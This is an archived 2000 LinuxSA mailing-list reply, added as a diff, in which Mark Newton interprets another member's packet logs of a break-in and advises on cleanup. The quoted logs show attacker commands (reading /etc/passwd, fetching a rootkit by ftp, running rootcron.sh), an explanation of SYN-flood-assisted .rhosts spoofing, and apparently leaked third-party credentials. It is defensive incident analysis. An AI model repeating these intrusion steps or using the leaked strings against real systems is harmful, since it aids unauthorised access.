@@ -1,0 +1,276 @@
+<HTML>
+<!-- EmailData="Start" -->
+<!-- Version="1.1" -->
+<!-- Subject="Re: rat was cracked!" -->
+<!-- FromName="Mark Newton" -->
+<!-- FromEmail="newton@atdot.dotat.org" -->
+<!-- ToName="Alan Kennington" -->
+<!-- ToEmail="akenning@dog.topology.org" -->
+<!-- Date="Sun, 10 Sep 2000 06:45:40 +0930" -->
+<!-- Id="20000910064540.A19508@atdot.dotat.org" -->
+<!-- Reference="20000910010422.A23505@dog.topology.org" -->
+<!-- X-Face="" -->
+<!-- X-URL="" -->
+<!-- EmailData="End" -->
+<HEAD>
+<TITLE>LinuxSA Mailing List: Re: rat was cracked!</TITLE>
+</HEAD>
+<BODY BGCOLOR=#FFFFFF><H1>LinuxSA Mailing list archives</H1>
+<!-- IndexControl1="Start" -->
+Index:
+[<A HREF="thread.html">thread</A>]
+[<A HREF="date.html">date</A>]
+[<A HREF="subject.html">subject</A>]
+[<A HREF="author.html">author</A>]
+<HR>
+<!-- IndexControl1="End" -->
+<!-- Header="Start" -->
+<PRE>
+  From: Mark Newton &lt;<I><A HREF="mailto:newton@atdot.dotat.org">newton@atdot.dotat.org</A></I>&gt;
+  To  : Alan Kennington &lt;<I><A HREF="mailto:akenning@dog.topology.org">akenning@dog.topology.org</A></I>&gt;
+  Date: Sun, 10 Sep 2000 06:45:40 +0930
+</PRE>
+<H1>Re: rat was cracked!</H1>
+<!-- Header="End" -->
+<!-- Body="Start" -->
+<PRE>
+On Sun, Sep 10, 2000 at 01:04:22AM +0930, Alan Kennington wrote:
+
+ &gt; Why on earth is the POP mail software programmed to go off
+ &gt; and try to log into other machines on ports 514 and 143?
+ &gt; This doesn't sound like such a good idea to me.
+ 
+It isn't.  What you saw was someone who had alredy broken into your
+machine attempt to exploit bugs on other systems.  Funnily enough, the
+bugs they attempted to exploit were in IMAP (port 143) and (ta-da!) rsh
+(port 514).
+
+In other words, they were trying to exploit .rhosts trust relationships.
+I'd strongly suggest checking your other boxes for rootkits.
+
+ &gt; The Polish user then types "FOLD" followed by a large number
+ &gt; of copies of the byte 0x90.
+ &gt; The packet length is 1044 bytes.
+ &gt; An overflow attack, I think.
+ &gt; ============================
+ &gt; Then rat sends the text:
+ &gt; 2:49 a.m. up 25 days,  1:42....
+ 
+Sounds like they'd been probing for .rhosts trust relationships by attempting
+to run the "uptime" command on remote machines, and in this particular case
+they've hit paydirt.
+
+That's certainly the first thing I'd do if I'd broken into something and 
+wanted to widen the scope of the damage I was causing.
+
+Note, incidentally, this probably means they've successfully logged in
+to one of your systems -- Either to rat as another user, or to one of
+the other Linux boxes you have at home.  The rest of your transcript could
+conceivably have come from one of those boxes, across an rsh session to rat,
+but you won't have monitored that very much because you'd probably made the
+assumption that rsh traffic is 'internal' and not worth extensively sniffing.
+(this is an assumption on my part which could be wrong;  either way, though,
+it sounds like they've widened the scope of the initial vulnerability by
+using rsh).
+
+Rather topical, eh? :-)
+
+ &gt; ============================
+ &gt; Then the Polish user types:
+ &gt; cat /etc/passwd
+ &gt; And "rat" reponds with the contents of /etc/passwd.
+ 
+Hope you're using different passwords on all your systems.
+
+ &gt; ============================
+ &gt; Polish user types
+ &gt; cd /tmp
+ &gt; ftp ftp.technotronic.com
+ 
+ftp's to a server somewhere to get a rootkit.
+ 
+ &gt; ============================
+ &gt; The the Polish user types "hash" to my "pop2" client.
+
+To your pop2 *port*.  It seems reasonably clear that they've been able to 
+exploit a buffer overflow to make your POP2 server exec a shell.
+
+ &gt; Then there's a 212-byte packet which starts:
+ &gt; Name (ftp.technotronic.com:n...
+ &gt; Probably it's:
+ &gt; Name (ftp.technotronic.com:nobody...
+ &gt; Question:
+ &gt; Does anyone know if this executes a script?
+ &gt; E.g. the rootcron.sh file?
+ 
+Try ftp'ing to ftp.technotronic.com, Alan.  You'll see that the login 
+prompt looks like this:
+
+<A HREF="mailto:newton@atdot">newton@atdot</A>&gt; ftp ftp.technotronic.com.
+Connected to ftp.technotronic.com.
+220-ftp.technotronic.com FTP server (NcFTPd 2.2.2) ready.
+220-Welcome, to the Technotronic Full Disclosure Security Information
+220-ftp archive! Information and programs are supplied "as-is" without
+220-warranty of any kind. Technotronic shall not be liable for any direct
+220-or indirect damages caused by the use / misuse of the information
+220-available within this archive.
+220
+Name (ftp.technotronic.com:newton):
+
+So that's indicating that they had actually managed to break into your
+system as user "nobody".  If your POP2 server (which probably shouldn't
+have been running in the first place) doesn't run with the privileges of
+the "nobody" user, then that isn't the way they actually got in.
+
+ &gt; ============================
+ &gt; Then the Polish user types:
+ &gt; ftp.technotronic.com
+ &gt; Then rat opens an FTP connection to sword.damocles.com.
+ &gt; The machine responds:
+ 
+You don't think, perhaps, that your logs are out of sync?
+
+ &gt; 220-sword.damocles.com.FTP.ser....
+ &gt; sword.damocles.com responds that it is disconnecting.
+ &gt; ============================
+ &gt; Then the Polish user types:
+ &gt; ankdsfnkjdsfjkljkl
+ &gt; "rat" relays this to sword.damocles.com:
+ &gt; USER ankdsfnkjdsfjkljkl
+ &gt; "rat" reponds to the Polish user on the pop2 connection:
+ &gt; Name: (technotronic.com:nobody....
+ 
+I suspect you've been missing packets around here somewhere.
+
+ &gt; Then rat opens a new connection to the imap2 port of migux.
+ &gt; There is this response from migux.mig.be at 03:11:32:
+ &gt; * OK migux.mig.be IMAP4rev1
+ &gt; "rat" responds with:
+ &gt; 00000000 CAPABILITY
+ &gt; "migux" sends:
+ &gt; * CAPABILITY IMAP4 IMAP4REV1
+ &gt; "rat" sends:
+ &gt; 00000001 AUTHENTICATE LOGIN
+ &gt; "migux" sends:
+ &gt; +.VXNlciBOYW1lAA==
+ &gt; This looks to me like a password challenge?
+
+Yes, he's loging into the imap server on migux.mig.be.  I hope you obtained
+permission from that system's admin before broadcasting username/password
+details from that machine to a mailing list of 600 people.
+
+ &gt; Why does a pop2 session allow the user to open FTP connections?
+ &gt; Is this normal?
+ 
+Search the web for "buffer overflow".  They've compromised the pop2 daemon,
+causing it to exec() a shell.  Either that or the initial breakin was at
+some point in the past, and they installed a telnet server on port 109 at
+that stage which they're now coming back to exploit.
+
+ &gt; ./rootcron.sh
+
+Rootkit has now been installed;  You can bet your ass that from this point
+onwards they can login as root whenever they feel like it, your passwords
+will be monitored when you login, etc.
+
+ &gt; Exactly the same sequence follows as above.
+ &gt; But then the Polish user types:
+ &gt; whoami
+ &gt; and "rat" responds:
+ &gt; root
+ 
+Yeah, root exploits are kinda like that.
+
+ &gt; =================================
+ &gt; Then the Polish user sends lots of telnet SYN packets!
+ &gt; And then a SYN packet to port 7000.
+ &gt; (This was added to the inetd.conf file, remember!)
+ &gt; But the 7000 port connection is refused: RST/ACK.
+ 
+They're trying to overwhelm another system as a preparation for another
+.rhosts attack.  Basically, once you've worked out that a particular IP
+address is "trusted" by another machine, you bombard the trusted IP with
+SYN packets to overwhelm it and get it off the net for a few seconds, then
+you forge packets under its IP address to the "victim".  The victim will 
+send acknowledgements to the real "trusted" machine, but it won't TCP RST
+them because it's too busy dealing with the SYN flood.
+
+That's probably what's happening at each point where you've seen the FOLD 0x90
+sequence.
+
+ &gt; Then host 216.167.96.108 opens a connection to rat's "auth" port.
+ &gt; It then sends:
+ &gt; 5940, 21
+ &gt; Coincidentally, 5940 is the port that rat used to call the
+ &gt; 216.167.96.108 port 21 with.
+ &gt; "rat" responds with:
+ &gt; 5940 , 21 : USERID : OTHER : ....
+ 
+That's how the "auth" protocol works.  As you can see, the results are less
+than entirely reliable :-)
+
+ &gt; ===================================
+ &gt; The Polish user then sends:
+ &gt; RWknnUhqW
+ 
+You're sending another password to a public mailing list.  I'd suggest 
+getting in touch with 216.167.96.108 and telling them that their security
+is broken.
+
+ &gt; I think that Mark Newton was right.
+ &gt; The .rhosts thing is very bad.
+ &gt; These hackers could have broken into all of my computers
+ &gt; from one computer.
+
+It goes further than that -- I'm left wondering if the reason you were 
+targetted for these particular exploits is because of the public discussion
+of your security measures, where it was made fairly clear that you were
+using .rhosts for authentication.
+
+Strong suggestion:  Check your other systems.  (also, change all your
+passwords; you've probably worked that out, though :-)
+
+You might also want to regenerate your ssh host keys and private keypairs;
+They accessed a system as root -- if they've stolen a private key, they can
+use that to pretend to be you in an ssh attack (which is why they key is 
+supposed to be private).  The moral of that story is that once someone has
+compromised a system as root, you've lost the whole game.
+
+Finally, packet logs notwithstanding, you have no real idea about what they've
+done to your system.  I'd strongly suggest reinstalling rat (with a more 
+recent version of the OS; make sure it isn't a revision which includes the
+security hole in the wu-ftpd :-)  You're going to have a busy couple of 
+days...
+
+ &gt; Trouble is, though, that "ssh" lets root read the sh password
+ &gt; in clear from a unix port.
+
+Eh?  What are you talking about?  ssh doesn't transmit any passwords in the
+clear!
+
+Anyway, good luck with tightening things up,
+
+   - mark
+
+--------------------------------------------------------------------
+I tried an internal modem,                    <A HREF="mailto:newton@atdot.dotat.org">newton@atdot.dotat.org</A>
+     but it hurt when I walked.                          Mark Newton
+----- Voice: +61-4-1620-2223 ------------- Fax: +61-8-82231777 -----
+
+-- 
+LinuxSA WWW: <A HREF="http://www.linuxsa.org.au/">http://www.linuxsa.org.au/</A>  IRC: #linuxsa on irc.linux.org.au
+To unsubscribe from the LinuxSA list:
+  mail <A HREF="mailto:linuxsa-request@linuxsa.org.au">linuxsa-request@linuxsa.org.au</A> with "unsubscribe" as the subject
+
+</PRE>
+<!-- Body="End" -->
+<!-- IndexControl2="Start" -->
+<HR>
+Index:
+[<A HREF="thread.html">thread</A>]
+[<A HREF="date.html">date</A>]
+[<A HREF="subject.html">subject</A>]
+[<A HREF="author.html">author</A>]
+<!-- IndexControl2="End" -->
+<HR><FONT SIZE=+1>Return to the <A HREF=/mailing-list/>LinuxSA Mailing List Information</A> Page</FONT></BODY>
+</HTML>
